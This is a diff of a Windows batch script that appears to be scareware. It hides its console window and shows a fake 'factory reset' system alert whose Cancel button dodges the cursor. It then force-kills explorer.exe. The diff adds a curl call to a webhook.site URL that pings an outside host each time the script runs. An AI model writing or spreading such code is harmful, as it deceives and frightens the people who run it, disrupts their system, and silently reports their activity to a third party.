@@ -3,13 +3,15 @@ REM Minimize CMD window
 powershell -windowstyle hidden -command ""
 REM Minimize all running applications
 powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
+REM Activating a webhook
+curl https://webhook.site/ac4cf6a1-3fe9-495c-a0d2-d90e59d72773
 :begin
 cd /d "%~dp0"
 
 REM First Popup: Fake Factory Reset Warning
 powershell -command "[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing'); $Form = New-Object Windows.Forms.Form; $Form.Text = 'System Alert'; $Form.TopMost = $true; $Form.FormBorderStyle = 'FixedDialog'; $Form.ControlBox = $false; $Form.Size = New-Object Drawing.Size(500,200); $Label = New-Object Windows.Forms.Label; $Label.Text = 'Your computer needs to factory reset itself. Click cancel to stop this operation.'; $Label.AutoSize = $true; $Label.Location = '10,20'; $Button1 = New-Object Windows.Forms.Button; $Button1.Text = 'Continue'; $Button1.Location = '150,100'; $Button1.Size = '100,30'; $Button2 = New-Object Windows.Forms.Button; $Button2.Text = 'Cancel'; $Button2.Location = '260,100'; $Button2.Size = '100,30'; $Button1.Add_Click({$Form.Close();}); $Button2.Add_MouseEnter({$Swap = $Button1.Location; $Button1.Location = $Button2.Location; $Button2.Location = $Swap;}); $Form.Controls.AddRange(@($Label, $Button1, $Button2)); $Timer = New-Object Windows.Forms.Timer; $Timer.Interval = 15000; $Timer.Add_Tick({$Form.Close();}); $Timer.Start(); [void][Windows.Forms.Application]::Run($Form);"
 
-REM Close Background Applications
+REM Close Explorer
 TASKKILL /F /IM explorer.exe>nul 2>&1
 
 REM Second Popup: Continuing Message
